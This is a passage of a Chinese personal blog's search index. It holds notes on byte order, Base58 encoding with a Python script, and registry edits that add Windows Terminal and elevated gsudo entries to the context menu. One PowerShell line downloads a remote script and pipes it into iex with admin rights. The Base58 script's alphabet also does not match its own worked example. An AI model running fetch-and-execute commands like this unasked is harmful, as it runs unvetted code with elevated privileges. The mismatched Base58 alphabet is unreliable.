align="left">0x34</td><td>0x56</td><td>0x78</td></tr></tbody></table><ul><li>小端模式:</li></ul><table><thead><tr><th>低地址</th><th></th><th></th><th>高地址</th></tr></thead><tbody><tr><td>0x78</td><td>0x56</td><td>0x34</td><td>0x12</td></tr></tbody></table><p>可见, 大端模式和字符串的存储模式类似。</p><ul><li>下面是两个具体例子:</li></ul><p>16bit宽的数0x1234在Little-endian模式（以及Big-endian模式）CPU内存中的存放方式（假设从地址0x4000开始存放）为:</p><table><thead><tr><th align="left"><em>内存地址</em></th><th>小端模式存放内容</th><th>大端模式存放内容</th></tr></thead><tbody><tr><td align="left"><em>0x4000</em></td><td>0x34</td><td>0x12</td></tr><tr><td align="left"><em>0x4001</em></td><td>0x12</td><td>0x34</td></tr></tbody></table><p> 32bit宽的数0x12345678在Little-endian模式以及Big-endian模式）CPU内存中的存放方式（假设从地址0x4000开始存放）为:</p><table><thead><tr><th align="left"><em>内存地址</em></th><th>小端模式存放内容</th><th>大端模式存放内容</th></tr></thead><tbody><tr><td align="left"><em>0x400</em></td><td>0x78</td><td>0x12</td></tr><tr><td align="left"><em>0x4001</em></td><td>0x56</td><td>0x34</td></tr><tr><td align="left"><em>0x4002</em></td><td>0x34</td><td>0x56</td></tr><tr><td align="left"><em>0x4003</em></td><td>0x12</td><td>0x78</td></tr></tbody></table><ul><li>大端小端没有谁优谁劣, 各自优势便是对方劣势:<ul><li>小端模式 :强制转换数据不需要调整字节内容, 1、2、4字节的存储方式一样。</li><li>大端模式 :符号位的判定固定为第一个字节, 容易判断正负。</li></ul></li></ul><h2 id="数组的存储"><a href="#数组的存储" class="headerlink" title="数组的存储"></a>数组的存储</h2><p>以<code>unsigned int value = 0x12345678</code>为例, 分别看看在两种字节序下其存储情况, 我们可以用<code>unsigned char buf[4]</code>来表示<code>value</code>:</p><ul><li>Big-Endian: 低地址存放高位, 如下:</li></ul><table><thead><tr><th>高地址</th><th></th></tr></thead><tbody><tr><td>buf[3] (0x78)</td><td>低位</td></tr><tr><td>buf[2] (0x56)</td><td></td></tr><tr><td>buf[1] (0x34)</td><td></td></tr><tr><td>buf[0] (0x12)</td><td>高位</td></tr><tr><td>低地址</td><td></td></tr></tbody></table><ul><li>Little-Endian: 低地址存放低位, 如下:</li></ul><table><thead><tr><th>高地址</th><th></th></tr></thead><tbody><tr><td>buf[3] (0x12)</td><td>高位</td></tr><tr><td>buf[2] (0x34)</td><td></td></tr><tr><td>buf[1] (0x56)</td><td></td></tr><tr><td>buf[0] (0x78)</td><td>低位</td></tr><tr><td>低地址</td><td></td></tr></tbody></table><h2 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h2><p>这是因为在计算机系统中, 我们是以字节为单位的, 每个地址单元都对应着一个字节, 一个字节为8bit。但是在C语言中除了8bit的char之外, 还有16bit的short型, 32bit的long型（要看具体的编译器）, 另外, 对于位数大于8位的处理器, 例如16位或者32位的处理器, 由于寄存器宽度大于一个字节, 那么必然存在着一个如果将多个字节安排的问题。因此就导致了大端存储模式和小端存储模式。</p><p>例如一个16bit的short型x, 在内存中的地址为0x0010, x的值为0x1122, 那么0x11为高字节, 0x22为低字节。对于大端模式, 就将0x11放在低地址中, 即0x0010中, 0x22放在高地址中, 即0x0011中。小端模式, 刚好相反。我们常用的X86结构是小端模式, 而KEIL C51则为大端模式。很多的ARM, DSP都为小端模式。有些ARM处理器还可以由硬件来选择是大端模式还是小端模式。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/ce123_zhouwei/article/details/6971544">详解大端模式和小端模式</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> binary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Base58</title>
      <link href="/note-crypto-base58/"/>
      <url>/note-crypto-base58/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="base58编码原理"><a href="#base58编码原理" class="headerlink" title="base58编码原理"></a>base58编码原理</h2><p>和base64编码一样, base58编码也是将非可视化字符可视化, 但不同的是base58去掉了: 0(数字零), O(大写字母O), I(大写字母I） 和</p><p>l（小写字母l）, 和几个影响双击选择的字符, 如/, +。</p><p>字符集最终如下:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/character_set.png" alt="character_set"></p><p>因为58 不是2的整次幂, 所以没有使用类似base64编码中使用直接截取3个字符转4个字符（3<em>8=4</em>6 , 2的6次方刚好64）的方法进行转换, 而是采用我们数学上经常使用的进制转换方法——辗转相除法。<strong>本质上, base64编码是64进制, base58是58进制</strong></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>如果将1234转换为58进制:</p><ul><li>1234除以58, 商21, 余数16, 查表得H</li><li>21处以58, 商0, 余数21, 查表得N</li></ul><p>最终得base58编码为NH</p><p>如果待转换的数前面有0怎么办？直接附加编码1来代表（编码表中1代表0）</p><h3 id="加解密脚本"><a href="#加解密脚本" class="headerlink" title="加解密脚本"></a>加解密脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">tab = <span class="string">b&#x27;ABCDEFGHJKLMNPQRSTUVWXYZ123456789abcdefghijkmnopqrstuvwxyz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b58encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">global</span> tab</span><br><span class="line">    num = bytes_to_long(s)</span><br><span class="line">    res = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(num):</span><br><span class="line">        res = <span class="built_in">bytes</span>([tab[num%<span class="number">58</span>]]) + res</span><br><span class="line">        num //= <span class="number">58</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b58decode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">global</span> tab</span><br><span class="line">    tmp = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[::-<span class="number">1</span>]:</span><br><span class="line">        tmp += <span class="built_in">bytes</span>([tab.index(i)])</span><br><span class="line">    <span class="built_in">pow</span> = <span class="number">1</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)):</span><br><span class="line">        res += <span class="built_in">pow</span>*tmp[i]</span><br><span class="line">        <span class="built_in">pow</span> *= <span class="number">58</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(res)[:]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Terminal 添加至右键菜单</title>
      <link href="/else-Windows-Terminal-add-to-right/"/>
      <url>/else-Windows-Terminal-add-to-right/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p><del>管理员权限用不了, 后面再修修</del> 使用 gsudo 的方法启用管理员权限</p></blockquote><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://www.cnblogs.com/lingr7/p/12812507.html">Windows Terminal添加到右键菜单</a></p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>先放上最终效果</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/effect.jpg" alt="effect"></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul><li><p>部分要<code>Lantern</code>替换为自己的用户名</p></li><li><p>配置Ubuntu 和 Windows Terminal 要注意自己的版本和文件目录</p><ul><li>比如:<code>Microsoft.WindowsTerminal_0.11.1191.0_x64__8wekyb3d8bbwe\\WindowsTerminal.exe</code>中的<code>0.11.1191.0_x64__8wekyb3d8bbwe</code></li><li>以及: <code>CanonicalGroupLimited.Ubuntu18.04onWindows_2020.1804.7.0_x64__79rhkp1fndgsc\\ubuntu1804.exe</code>中的<code>Ubuntu18.04onWindows_2020.1804.7.0_x64__79rhkp1fndgsc</code>和<code>ubuntu1804.exe</code></li><li>这里推荐 <a href="https://www.voidtools.com/zh-cn/">Everything</a> 在目录<code>C:\\Program Files\\WindowsApps</code>进行关键字<code>CanonicalGroupLimited</code>和<code>Microsoft.WindowsTerminal</code>搜索, 找到文件名后修改reg文件内容中对应的文件目录以及文件名(其实文件数不多, 直接看也可以), 不过首先要取得权限: <a href="https://jingyan.baidu.com/article/49711c6180823afa441b7cd4.html">Win10下WindowsApps权限怎么获取-百度经验</a></li></ul></li><li><p>启动对应终端名字需要一致</p><ul><li><p>形如<code>&quot;cmd.exe /s /c pushd \&quot;%V\&quot; &amp; start wt -p \&quot;Ubuntu\&quot; -d .&quot;</code>中的<code>&quot;Ubuntu&quot;</code></p></li><li><p>或者是 <code>C:\\Users\\Lantern\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe -p \&quot;Ubuntu\&quot; -d .</code> 中的<code>Ubuntu</code></p></li><li><p>需要和配置文件中的名字相一致, 如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/same_name.jpg" alt="same_name"></p></li></ul></li><li><p>下面的文件内容中, 我添加了<code>Git Bash</code>, 若不需要, 可以自行删除； 需要, 则自行修改文件目录和<code>Windos Terminal</code>配置文件(修改配置文件可参考上图)</p></li><li><p>使用管理员权限要按照<code>gsudo</code>, PowerShell 输入下列命令即可, 管理员权限</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PowerShell <span class="literal">-Command</span> <span class="string">&quot;Set-ExecutionPolicy RemoteSigned -scope Process; iwr -useb https://raw.githubusercontent.com/gerardog/gsudo/master/installgsudo.ps1 | iex&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="注册表reg文件内容"><a href="#注册表reg文件内容" class="headerlink" title="注册表reg文件内容"></a>注册表reg文件内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">; Windows terminal</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\MenuWindowsTerminal]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Windows Terminal&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;C:\\Users\\Lantern\\AppData\\Local\\terminal\\terminal.ico&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=&quot;Directory\\ContextMenus\\MenuWindowsTerminal&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\background\shell\MenuWindowsTerminal]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Windows Terminal&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;C:\\Users\\Lantern\\AppData\\Local\\terminal\\terminal.ico&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=&quot;Directory\\ContextMenus\\MenuWindowsTerminal&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\LibraryFolder\shell\MenuWindowsTerminal]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Windows Terminal&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;C:\\Users\\Lantern\\AppData\\Local\\terminal\\terminal.ico&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=&quot;Directory\\ContextMenus\\MenuWindowsTerminal&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Drive\shell\MenuWindowsTerminal]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Windows Terminal&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;C:\\Users\\Lantern\\AppData\\Local\\terminal\\terminal.ico&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=&quot;Directory\\ContextMenus\\MenuWindowsTerminal&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\LibraryFolder\Background\shell\MenuWindowsTerminal]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Windows Terminal&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;C:\\Users\\Lantern\\AppData\\Local\\terminal\\terminal.ico&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=&quot;Directory\\ContextMenus\\MenuWindowsTerminal&quot;</span><br><span class="line"></span><br><span class="line">; Windows Terminal SUDO</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\MenuWindowsTerminalSudo]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Windows Terminal (Admin)&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;C:\\Users\\Lantern\\AppData\\Local\\terminal\\terminal.ico&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=&quot;Directory\\ContextMenus\\MenuWindowsTerminalSudo&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\background\shell\MenuWindowsTerminalSudo]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Windows Terminal (Admin)&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;C:\\Users\\Lantern\\AppData\\Local\\terminal\\terminal.ico&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=&quot;Directory\\ContextMenus\\MenuWindowsTerminalSudo&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\LibraryFolder\shell\MenuWindowsTerminalSudo]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Windows Terminal (Admin)&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;C:\\Users\\Lantern\\AppData\\Local\\terminal\\terminal.ico&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=&quot;Directory\\ContextMenus\\MenuWindowsTerminalSudo&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Drive\shell\MenuWindowsTerminalSudo]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Windows Terminal (Admin)&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;C:\\Users\\Lantern\\AppData\\Local\\terminal\\terminal.ico&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=&quot;Directory\\ContextMenus\\MenuWindowsTerminalSudo&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\LibraryFolder\Background\shell\MenuWindowsTerminalSudo]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Windows Terminal (Admin)&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;C:\\Users\\Lantern\\AppData\\Local\\terminal\\terminal.ico&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=&quot;Directory\\ContextMenus\\MenuWindowsTerminalSudo&quot;</span><br><span class="line"></span><br><span class="line">; Subcommands</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminal\shell\CMD]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;CMD&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=-</span><br><span class="line">&quot;Icon&quot;=&quot;imageres.dll, -5323&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminal\shell\CMD\command]</span><br><span class="line">@=&quot;C:\\Users\\Lantern\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe -p \&quot;cmd\&quot; -d .&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminal\shell\Powershell]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Windows PowerShell&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=-</span><br><span class="line">&quot;Icon&quot;=&quot;imageres.dll, -5372&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminal\shell\Powershell\command]</span><br><span class="line">@=&quot;C:\\Users\\Lantern\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe -p \&quot;Windows PowerShell\&quot; -d .&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminal\shell\Ubuntu]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Ubuntu&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=-</span><br><span class="line">&quot;Icon&quot;=&quot;C:\\Program Files\\WindowsApps\\CanonicalGroupLimited.Ubuntu18.04onWindows_1804.2020.423.0_x64__79rhkp1fndgsc\\ubuntu1804.exe&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminal\shell\Ubuntu\command]</span><br><span class="line">@=&quot;C:\\Users\\Lantern\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe -p \&quot;Ubuntu\&quot; -d .&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminal\shell\Git Bash]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Git Bash&quot;</span><br><span class="line">&quot;ExtendedSubCommandsKey&quot;=-</span><br><span class="line">&quot;Icon&quot;=&quot;D:\\Program Files\\Git\\git-bash.exe&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminal\shell\Git Bash\command]</span><br><span class="line">@=&quot;C:\\Users\\Lantern\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe -p \&quot;Git Bash\&quot; -d .&quot;</span><br><span class="line"></span><br><span class="line">; Subcommands Sudo</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminalSudo\shell\CMD]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;CMD&quot;</span><br><span class="line">&quot;HasLUAShield&quot;=&quot;&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;imageres.dll, -5324&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminalSudo\shell\CMD\command]</span><br><span class="line">@=&quot;cmd.exe /s /c pushd \&quot;%V\&quot; &amp; gsudo start wt -p \&quot;cmd\&quot; -d .&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminalSudo\shell\Powershell]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Windows PowerShell&quot;</span><br><span class="line">&quot;HasLUAShield&quot;=&quot;&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;imageres.dll, -5373&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminalSudo\shell\Powershell\command]</span><br><span class="line">@=&quot;cmd.exe /s /c pushd \&quot;%V\&quot; &amp; gsudo start wt -p \&quot;Windows PowerShell\&quot; -d .&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminalSudo\shell\Ubuntu]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Ubuntu&quot;</span><br><span class="line">&quot;HasLUAShield&quot;=&quot;&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;C:\\Program Files\\WindowsApps\\CanonicalGroupLimited.Ubuntu18.04onWindows_1804.2020.423.0_x64__79rhkp1fndgsc\\ubuntu1804.exe&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminalSudo\shell\Ubuntu\command]</span><br><span class="line">@=&quot;cmd.exe /s /c pushd \&quot;%V\&quot; &amp; gsudo start wt -p \&quot;Ubuntu\&quot; -d .&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminalSudo\shell\Git Bash]</span><br><span class="line">&quot;MUIVerb&quot;=&quot;Git Bash&quot;</span><br><span class="line">&quot;HasLUAShield&quot;=&quot;&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;D:\\Program Files\\Git\\git-bash.exe&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\ContextMenus\MenuWindowsTerminalSudo\shell\Git Bash\command]</span><br><span class="line">@=&quot;cmd.exe /s /c pushd \&quot;%V\&quot; &amp; gsudo start wt -p \&quot;Git Bash\&quot; -d .&quot;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.poychang.net/run-windows-terminal-as-administrator-with-elevated-admin-permissions/">使用系統管理員身分開啟 Windows Terminal 分頁</a></p><p><a href="https://www.cnblogs.com/lingr7/p/12812507.html">Windows Terminal添加到右键菜单</a></p>]]></content>
      
      
      <categories>
          
          <category> ELSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/else-hello-world/"/>
      <url>/else-hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>不管过去有多难, 你都可以重新开始</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/begin_again.jpg" alt="begin_again"></p>]]></content>
      
      
      <categories>
          
          <category> ELSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELSE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
